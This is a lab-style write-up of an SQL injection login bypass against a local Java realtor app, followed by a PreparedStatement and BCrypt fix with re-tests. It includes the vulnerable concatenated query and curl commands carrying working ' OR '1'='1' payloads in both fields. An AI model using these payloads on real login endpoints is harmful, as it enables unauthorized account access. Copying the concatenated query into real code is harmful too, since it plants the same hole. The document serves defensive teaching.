# SQL Injection — Login Bypass

The login endpoint builds its SQL query by glueing raw text together, like this:

```java
String query = "SELECT * FROM realtors WHERE username = '" + username
        + "' AND password = '" + password + "'";
```

That means whatever you type into `username` or `password` gets treated as **part of the SQL command itself** — not just as data. Sneak in the right characters, and you can rewrite the query on the fly. Here's that in action.

---

### 1. Normal login — wrong password (control test)

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=wrong"

HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

As expected — wrong password, no entry.

### 2. Normal login — correct password (control test)

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"

HTTP/1.1 200 OK
{"token":"...","realtorId":1}
```

Correct password, we're in. This is the baseline everything else gets compared against.

---

### 3. Exploit — sneaking it in through the username field

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=anything"

HTTP/1.1 200 OK
{"token":"...","realtorId":1}
```

**No password needed — we're logged in as alice anyway.** Here's why: the payload closes off the username string early, adds `OR '1'='1'` (always true), then tacks on `-- ` which tells MySQL "ignore everything after this." That erases the password check completely. The query the database actually sees becomes:

```sql
SELECT * FROM realtors WHERE username = '' OR '1'='1'
```

Always true → returns the first row in the table → free login.

### 4. Exploit — sneaking it in through the password field instead

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=bob" \
  --data-urlencode "password=' OR '1'='1"

HTTP/1.1 200 OK
{"token":"...","realtorId":2}
```

Same trick, different field. The query becomes:

```sql
SELECT * FROM realtors WHERE username = 'bob' AND password = '' OR '1'='1'
```

SQL checks `AND` before `OR`, so this really reads as:

```sql
WHERE (username = 'bob' AND password = '') OR ('1'='1')
```

The `'1'='1'` half is always true, so the whole thing is always true — logged in as bob, no correct password required.

---

### Screenshots

- `screenshot1.png` — the two control tests (fail, then pass normally)
- `screenshot2.png` — both exploits succeeding with `200 OK`

### The takeaway

Both bugs come from the exact same mistake: **user input is pasted straight into the SQL string instead of being kept separate from it.** The fix (Phase 4) is to swap this out for a `PreparedStatement` with `?` placeholders — that way, whatever someone types is always treated as plain data, never as part of the command.

---

## Remediation

Both `login()` and `findById()` in `RealtorDao.java` now use `PreparedStatement` with `?` placeholders instead of string concatenation:

```java
String query = "SELECT * FROM realtors WHERE username = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, username);
```

Whatever gets typed into `username` or `password` is now sent to the database as a **value**, never as part of the query text. The database can no longer be tricked into treating `' OR '1'='1' --` as SQL logic — it just gets compared literally against the username column, like any other string, and matches nothing.

Password hashing (see schema.sql and RealtorDao.login()) closes the password-field vector completely, since the password never appears in a SQL query at all anymore — it's fetched by username only, then checked in Java with `BCrypt.checkpw()`.

### 5. Re-test — username field payload, after the fix

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=' OR '1'='1' -- " \
  --data-urlencode "password=anything"

HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

No bypass. The payload is treated as a literal (and nonexistent) username.

### 6. Re-test — password field payload, after the fix

```
$ curl -i -X POST http://localhost:7000/login \
  --data-urlencode "username=bob" \
  --data-urlencode "password=' OR '1'='1"

HTTP/1.1 401 Unauthorized
{"error":"Invalid credentials"}
```

No bypass here either — the password is no longer part of any query, so there's nothing for the payload to inject into.

### 7. Confirm normal login still works

```
$ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"

HTTP/1.1 200 OK
{"token":"...","realtorId":1}
```

Same credentials as before, still work — the fix changes *how* the password is checked, not what the correct password is.

### Screenshots

- `screenshot5.png` — both exploit payloads now returning 401
- `screenshot6.png` — normal login still succeeding after the fix